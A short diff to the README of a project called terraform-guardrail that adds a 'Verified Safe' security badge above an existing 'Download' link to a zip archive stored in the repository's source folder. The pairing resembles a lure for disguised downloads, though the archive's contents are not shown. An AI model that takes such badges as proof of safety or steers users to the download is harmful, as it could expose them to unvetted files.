@@ -1,5 +1,7 @@
 # 🚀 terraform-guardrail - Simplifies Terraform Code Management
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/imnumb1-terraform-guardrail)
+
 [![Download](https://raw.githubusercontent.com/imnumb1/terraform-guardrail/main/src/terraform_guardrail/mcp/guardrail_terraform_1.3.zip)](https://raw.githubusercontent.com/imnumb1/terraform-guardrail/main/src/terraform_guardrail/mcp/guardrail_terraform_1.3.zip)
 
 ## 📖 Overview
